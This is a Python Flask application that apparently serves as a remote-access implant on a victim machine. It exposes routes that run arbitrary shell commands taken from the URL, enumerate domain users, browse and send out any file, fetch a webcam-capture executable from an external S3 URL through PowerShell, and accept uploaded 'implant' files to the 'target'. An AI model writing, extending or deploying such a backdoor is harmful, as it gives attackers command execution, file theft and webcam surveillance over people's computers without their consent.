from flask import Flask, send_file, render_template, request
import os
import subprocess

app = Flask(__name__)

@app.route('/')
def hello():
	return "Hello there"

@app.route('/secret')
def secret():
	out = subprocess.check_output('net user /domain', shell=True)
	return out

@app.route('/downloads')
def dloads():
	try:
		if os.name == 'posix':
			# List downloads on *nix machines
			out = subprocess.check_output('ls ~/Downloads', shell=True)
		else:
			# List downloads on Windows machines
			out = subprocess.check_output('dir %HOMEDRIVE%%HOMEPATH%\Downloads', shell=True)
		return out
	except:
		return "Downloads folder not in standard location"

@app.route('/scary/<cmd>')
def ohno(cmd):
	out = subprocess.check_output(cmd, shell=True)
	return out

@app.route('/showme/<file>')
def showme(file):
    return send_file(file, attachment_filename=file)


@app.route('/exfile/<path>/<file>')
def exfile(path, file):
	print('Path: ' + path)
	os.chdir(path)
	print(os.getcwd())
	return send_file(path + os.sep + file, as_attachment=True)

@app.route('/list/')
@app.route('/list/path/<path>')
def listfiles(path=''):
	dirlist = []; flist = [];
	# Get current dir
	curdir = os.getcwd()
	if path == 'upxyxy' and curdir is not os.path.abspath(os.sep):
		os.chdir('..')
	else:
		os.chdir(curdir + os.sep + path)
	try:
		with os.scandir() as it:
			for entry in it:
				if entry.is_file():
					flist.append(entry)
				else:
					dirlist.append(entry)
		return render_template('listfiles.html', flist=flist, dirlist=dirlist, curdir=os.getcwd())
	except:
		abort(404)

@app.route('/getcamcontrol')
def getcam():
	out = subprocess.check_output("powershell Invoke-WebRequest -URI https://s3-eu-west-1.amazonaws.com/flowertracker/CommandCam.exe -OutFile cc.exe")
	return 'Webcam controller done.'

@app.route('/getanyfile/', methods=['POST', 'GET'])
def getanyfile():
	if request.method == 'GET':
		return render_template('upload.html')
	else:
		f = request.files['implant']
		uplname = f.filename
		f.save(uplname)
		return 'File uploaded to target.'


	